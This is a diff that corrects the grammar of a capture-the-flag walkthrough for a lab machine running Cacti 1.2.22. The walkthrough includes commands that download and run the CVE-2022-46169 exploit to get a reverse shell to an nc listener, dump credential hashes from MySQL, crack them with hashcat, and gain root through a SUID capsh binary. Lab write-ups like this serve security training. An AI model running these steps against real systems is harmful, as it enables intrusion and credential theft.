@@ -1,28 +1,28 @@
-I started with 'ping -c4 10.10.11.211' to make sure I had connection to target machine.
+I started with 'ping -c4 10.10.11.211' to make sure I had a connection to the target machine.
 Continued with 'nmap -p- 10.10.11.211' to find all open ports for further scanning.
-Next I used 'nmap -sVC -p22,80 10.10.11.211' to find out versions of services and headers to the web server.
+Next, I used 'nmap -sVC -p22,80 10.10.11.211' to find out the versions of services and headers to the web server.
 There is a login page running on cacti version 1.2.22. Looking at the source code there is a lot of JavaScript variables for some reason. 
 No plain username or passwords thought. 
 Searching 'cacti 1.2.22 exploit' finds a github page that has 'CVE-2022-46169' exploit script for this cacti version.
 I downloaded it to my pc with 'wget https://raw.githubusercontent.com/FredBrave/CVE-2022-46169-CACTI-1.2.22/main/CVE-2022-46169.py'.
-Started a nc listener with 'nc -lvnp 4444' and ran the script with 'python3 CVE-2022-46169.py -u http://10.10.11.211 --LHOST=10.10.16.34 --LPORT=4444'.
-It worked and im in as 'www-data'!
+Started an nc listener with 'nc -lvnp 4444' and ran the script with 'python3 CVE-2022-46169.py -u http://10.10.11.211 --LHOST=10.10.16.34 --LPORT=4444'.
+It worked and I'm in as 'www-data'!
 
-There is a lot of files but one is 'entrypoint.sh' in / that seems interesting. 
-Line 'mysql --host=db --user=root --password=root cacti -e "show tables"' gives all tables from the cacti and there is 'user_auth' among many files. 
+There are a lot of files but one is 'entrypoint.sh' in / that seems interesting. 
+Line 'mysql --host=db --user=root --password=root cacti -e "show tables"'give all tables from the cacti and there is 'user_auth' among many files. 
 'mysql --host=db --user=root --password=root cacti -e "select * from user_auth"' show all the contents of user_auth table.
 'mysql --host=db --user=root --password=root cacti -e "select username,password from user_auth"' for things that intrest us.
 We get usernames and password hashes that can be probably cracked.
-I also uploaded 'lse.sh' to help with enumeration. It seems that we are in docker container.
-There is suid binary 'capsh' and I use it to gain root with './capsh --gid=0 --uid=0 --' it does not really give anything at this point thought.
+I also uploaded 'lse.sh' to help with enumeration. It seems that we are in a docker container.
+There is suid binary 'capsh' and I use it to gain root with './capsh --gid=0 --uid=0 --' it does not really give anything at this point though.
 
-Cracking the hash started with 'hashid -m "<hash>"' it shows type of the hash for hashcat.
+Cracking the hash started with 'hashid -m "<hash>"' it shows the type of the hash for hashcat.
 'hashcat -a 0 -m 3200  '<hash>' /usr/share/wordlists/rockyou.txt' tries to crack the password with rockyou.txt.
-I can now use cracked password to shh as marcus to the target.
+I can now use a cracked password to shh as marcus to the target.
 
 There is user.txt in '/home/marcus'.
-Uploaded lse.sh again to enumerate target. Didn't find anything interesting other than marcu's mail.
-There seems to be multible vulnerabilites on the machine. 
+Uploaded lse.sh again to enumerate the target. Didn't find anything interesting other than marcu's mail.
+There seems to be multiple vulnerabilities on the machine. 
 CVE-2021-33033, CVE-2020-25706 and CVE-2021-41091. Kerner exploits are mostly unstable, cacti has already been upgraded to 1.2.22 from 1.2.13 
-but last one seems promising. 
-Searching CVE-2021-41091 finds a github script again but exploit seems easy enough to run without the script.
+but the last one seems promising. 
+Searching CVE-2021-41091 finds a github script again but the exploit seems easy enough to run without the script.
